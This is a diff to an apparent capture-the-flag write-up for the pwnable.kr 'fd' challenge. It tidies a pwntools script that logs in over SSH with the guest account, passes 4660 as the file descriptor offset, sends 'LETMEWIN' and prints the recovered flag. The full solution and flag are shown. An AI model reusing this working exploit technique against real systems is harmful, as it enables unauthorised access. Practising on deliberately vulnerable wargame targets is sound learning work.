@@ -150,12 +150,13 @@ from pwn import *
 
 shell = ssh("fd", "pwnable.kr", password="guest", port=2222)
 process = shell.process(executable="./fd", argv=["fd", "4660"])
-process.sendline(b"LETMEWIN")
 
-msg = process.recv().decode()
-flag = process.recv().decode()
+process.sendline(b"LETMEWIN")
+response = process.recvall().decode()
+msg = response.split("\n")[0]
+flag = response.split("\n")[1]
 log.info(msg)
-log.success(f"Flag: {flag}")
+log.success(f"Flag: \"{flag}\"")
 
 process.close()
 shell.close()
@@ -173,7 +174,7 @@ then using the `python exploit.py` command we get:
     ASLR:     Enabled
 [+] Starting remote process bytearray(b'./fd') on pwnable.kr: pid 58012
 [*] good job :)
-[+] Flag: mommy! I think I know what a file descriptor is!!
+[+] Flag: "mommy! I think I know what a file descriptor is!!"
 [*] Stopped remote process 'fd' on pwnable.kr (pid 58012)
 [*] Closed connection to 'pwnable.kr'
 ```
